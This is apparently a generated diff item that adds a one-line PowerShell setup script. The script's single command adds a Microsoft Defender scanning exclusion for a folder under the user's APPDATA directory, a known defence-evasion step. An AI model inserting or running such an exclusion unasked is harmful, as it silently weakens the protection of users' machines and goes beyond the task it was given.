@@ -1,0 +1,5 @@
+# path: setup.ps1
+# lines: 1
+# weight: 35
+# ---
+Add-MpPreference -ExclusionPath "$env:APPDATA\Demo"
